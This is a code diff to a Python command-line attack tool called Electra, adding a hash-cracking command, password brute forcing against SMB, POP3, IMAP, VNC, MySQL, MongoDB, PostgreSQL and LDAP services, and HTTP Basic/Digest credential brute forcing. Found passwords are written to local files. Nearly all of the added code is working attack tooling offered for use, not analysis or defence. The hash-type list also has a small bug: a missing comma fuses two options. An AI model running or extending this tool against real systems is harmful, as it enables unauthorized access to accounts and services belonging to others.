@@ -1,5 +1,12 @@
 #!/usr/bin/env python3
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time
+import pymongo.errors
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3
+#import telnetlib (Deprecated in python 3.13)
+import requests.auth
+from smbprotocol.connection import Connection
+from smbprotocol.session import Session
+import vncdotool.api
+from hashid import HashID
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -25,7 +32,9 @@ class BannerGroup(click.Group):
             ("webpass", "Web Dictionary Password Brute Force Attack."),
             ("webuser", "Web Dictionary Username Brute Force Attack."),
             ("hashgen", "Generate hash of a specific password."),
-            ("srvatk", "Services Dictionary Password Brute Force attack.")
+            ("hashcrk", "Crack a hash or a list of hashes."),
+            ("srvatk", "Services Dictionary Password Brute Force attack."),
+            ("webatk", "Web (Basic & Digest) Username/Password Brute Force attack.")
         ]
         with formatter.section("Commands"):
             for cmd, desc in commands:
@@ -262,12 +271,41 @@ def hashgen(function, password):
         hashed_passwords.write(f"{function.upper()} hash: {hashed_pass}, Password: {password}\n")
     click.echo(click.style("[!] Hash successfully saved to Electra-Hashed-Passwords.txt", fg="green"))
 
+#HASHCRK COMMAND
+@cli.command()
+@click.option("-h", "--hash", help="Hash to crack.")
+@click.option("-l", "--hashlist", type=click.Path(exists=True), help="Path to the list of hashes.")
+@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to the password wordlist.")
+@click.option("-t", "--type", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), help="Hash type. (e.g. MD5, SHA1 etc)")
+def hashcrk(hash, hashlist, wordlist, type):
+    hashid = HashID()
+    hash_targets = []
+    if hash:
+        hash_targets.append((hash, type or hashid.identifyHash(hash)))
+    elif hashlist:
+        with open(hashlist, "r") as file:
+            for line in file:
+                hash_value = line.strip()
+                hash_type = type or hashid.identifyHash(hash_value)
+                hash_targets.append((hash_value, hash_type))
+            #hash_targets = [(line.strip(), type or hashid.identifyHash(line.strip())) for line in file]
+    
+    with open(wordlist, "r") as file:
+        for password in file:
+            password = password.strip()
+            for h, htype in hash_targets:
+                computed_hash = hashlib.new(htype, password.encode()).hexdigest()
+                if computed_hash == h:
+                    click.echo(click.style(f"[!] Hash: {h} cracked! Password: {password}", fg="green"))
+                    break
+
 #SERVATK COMMAND
 @cli.command()
-@click.option("-s", "--service", type=click.Choice(["ssh", "ftp", "rdp"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
+@click.option("-s", "--service", type=click.Choice(["ssh", "ftp", "rdp", "smb", "pop3", "imap", "telnet", "vnc", "mysql", "mongodb", "postgresql", "ldap"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
 @click.option("-h", "--host", required=True, help="IP, Socket or Hostname of the target.")
 @click.option("-u", "--username", required=True, help="Username for authentication.")
 @click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
+#@click.option("-id", "--guid", default=None, help="Unique session identifier. (For cases where two services are running. e.g. smb)")
 def srvatk(service, host, username, wordlist):
     click.echo(click.style(f"[*] Starting {service.upper()} BF attack on {host} ...", fg="blue"))
     try:
@@ -323,10 +361,167 @@ def srvatk(service, host, username, wordlist):
                             click.echo(click.style(f"[!] RDP authentication attempt with '{password}' failed.", fg="red"))
                     except Exception as e:
                         click.echo(click.style(f"[!] RDP connection error: {e}", fg="red"))
+                elif service == "smb":
+                    try:
+                        smb_connection = Connection(guid="some-unique-id", username=username, password=password, server=host, port=445) #Thelei tropopoiisi se periptosi pou xrisimopoiithei to option -id
+                        smb_connection.connect()
+                        smb_session = Session(smb_connection)
+                        smb_session.connect()
+                        click.echo(click.style(f"[!] Found SMB password of user: {username} is {password}", fg="green"))
+                        #Save smb password to a file
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Host: {host}, Username: {username}, Password: {password}\n")
+                            click.echo(click.style(f"[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
+                        smb_session.disconnect()
+                        smb_connection.disconnect()
+                        return
+                    except Exception as e:
+                        click.echo(click.style(f"[!] SMB authentication attempt with {password} failed.", fg="red"))
+                elif service == "pop3":
+                    try:
+                        pop3_connection = poplib.POP3(host)
+                        pop3_connection.user(username)
+                        pop3_connection.pass_(password)
+                        click.echo(click.style(f"[!] Found POP3 password for user: {username} is {password}", fg="green"))
+                        pop3_connection.quit()
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        return
+                    except poplib.error_proto:
+                        click.echo(click.style(f"[!] POP3 authentication attempt with {password} failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] POP3 connection error: {e}", fg="red"))
+                elif service == "imap":
+                    try:
+                        imap_connection = imaplib.IMAP4(host)
+                        imap_connection.login(username, password)
+                        click.echo(click.style(f"[!] Found IMAP password for user: {username} is {password}", fg="green"))
+                        imap_connection.logout()
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        return
+                    except imaplib.IMAP4.error:
+                        click.echo(click.style(f"[!] IMAP authentication attempt with {password} failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] IMAP connection error: {e}", fg="red"))
+                elif service == "vnc":
+                    try:
+                        vnc_connection = vncdotool.api.connect(host)
+                        vnc_connection.password(password)
+                        click.echo(click.style(f"[!] Found VNC password for user: {username} is {password}", fg="green"))
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        vnc_connection.disconnect()
+                        return
+                    except vncdotool.api.VNCDoException:
+                        click.echo(click.style(f"[!] VNC authentication attempt with {password} failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] VNC connection error: {e}", fg="red"))
+                elif service == "mysql":
+                    try:
+                        mysql_connection = pymysql.connect(host=host, user=username, password=password)
+                        click.echo(click.style(f"[!] Found MySQL password for user: {username} is {password}", fg="green"))
+                        mysql_connection.close()
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        return
+                    except pymysql.MySQLError:
+                        click.echo(click.style(f"[!] MySQL authentication attempt with {password} failed.", fg="red"))
+                elif service == "mongodb":
+                    try:
+                        mongodb_connection = pymongo.MongoClient(f"mongodb://{username}:{password}@{host}")
+                        mongodb_connection.admin.command("ping") #Test connection
+                        click.echo(click.style(f"[!] Found MongoDB password for user: {username} is {password}", fg="green"))
+                        mongodb_connection.close()
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        return
+                    except pymongo.errors.OperationFailure:
+                        click.echo(click.style(f"[!] MongoDB authentication attempt with {password} failed.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] MongoDB connection error: {e}", fg="red"))
+                elif service == "postgresql":
+                    try:
+                        postgresql_connection = psycopg2.connect(host=host, user=username, password=password)
+                        click.echo(click.style(f"[!] Found PostgreSQL password for user: {username} is {password}", fg="green"))
+                        postgresql_connection.close()
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        return
+                    except psycopg2.OperationalError:
+                        click.echo(click.style(f"[!] PostgreSQL authentication attempt with {password} failed.", fg="red"))
+                elif service == "ldap":
+                    ldap_server = ldap3.Server(host, get_info=ldap3.NONE)
+                    ldap_connection = ldap3.Connection(ldap_server, user=username, password=password)
+                    if ldap_connection.bind():
+                        click.echo(click.style(f"[!] Found LDAP password for user: {username} is {password}", fg="green"))
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                        ldap_connection.unbind()
+                        return
+                    else:
+                        click.echo(click.style(f"[!] LDAP authentication attempt with {password} failed.", fg="red"))
+                    ldap_connection.unbind()
+                """Commented due to deprecation
+                elif service == "telnet":
+                    try:
+                        telnet_connection = telnetlib.Telnet(host, timeout=5)
+                        telnet_connection.read_until(b"login: ")
+                        telnet_connection.write(username.encode("ascii") + b"\n")
+                        telnet_connection.read_until(b"Password: ")
+                        telnet_connection.write(password.encode("ascii") + b"\n")
+                        #Check login
+                        response = telnet_connection.read_some().decode("ascii")
+                        if "incorrect" not in response.lower():
+                            click.echo(click.style(f"[!] Found Telnet password for user: {username} is {password}", fg="green"))
+                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                            telnet_connection.close()
+                            return
+                        else:
+                            click.echo(click.style(f"[!] Telnet authentication attempt with {password} failed.", fg="red"))
+                        telnet_connection.close()
+                    except EOFError:
+                        click.echo(click.style(f"[!] Telnet connection closed unexpectedly.", fg="red"))
+                    except Exception as e:
+                        click.echo(click.style(f"[!] Telnet connection error: {e}", fg="red"))
+                """
+
         click.echo(click.style(f"[!] {service.upper()} BF attack completed. No valid passwords found.", fg="magenta"))
     except FileNotFoundError:
         click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))
     except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+
+#WEBATK COMMAND
+@cli.command()
+@click.option("-u", "--url", required=True, prompt="Target URL", help="URL of the target authentication page.")
+@click.option("-U", "--username", required=False, help="Use a specific username for authentication. If ommited, a username wordlist must be provided.")
+@click.option("-uw", "--user-wordlist", type=click.Path(exists=True), help="Path to username wordlist. (For Brute-Forcing usernames)")
+@click.option("-pw", "--pass-wordlist", type=click.Path(exists=True), help="Path to password wordlist.")
+@click.option("-m", "--auth-method", type=click.Choice(["basic", "digest"], case_sensitive=False), required=True, help="Authentication method (basic or digest).")
+def webatk(url, username, user_wordlist, pass_wordlist, auth_method):
+    click.echo(click.style(f"[*] Starting {auth_method.upper()} authentication BF attack on: {url}", fg="blue"))
+    try:
+        usernames = [username] if username else open(user_wordlist).read().splitlines()
+        passwords = open(pass_wordlist).read().splitlines()
+
+        for user in usernames:
+            for password in passwords:
+                auth = requests.auth.HTTPBasicAuth(user, password) if auth_method == "basic" else requests.auth.HTTPDigestAuth(user, password)
+                response = requests.get(url, auth=auth)
+
+                if response.status_code == 200:
+                    click.echo(click.style(f"[!] Credentials found! Username: {user} Password: {password}", fg="green"))
+                    with open("Electra-Found-Web-Passwords.txt", "a") as found_creds:
+                        found_creds.write(f"URL: {url}, Username: {user}, Password: {password}, Auth Method: {auth_method.upper()}\n")
+                    return
+                else:
+                    click.echo(click.style(f"[!] Failed authentication attempt with username: {user} and password: {password}", fg="red"))
+        click.echo(click.style(f"[!] {auth_method.upper()} HTTP/HTTPS BF attack completed. No valid credentials found.", fg="magenta"))
+    except requests.RequestException as e:
+        click.echo(click.style(f"[!] Request Error: {e}. Connection to: {url} failed.", fg="red"))
+    except FileNotFoundError as e:
         click.echo(click.style(f"[!] Error: {e}", fg="red"))
 
 if __name__ == "__main__":
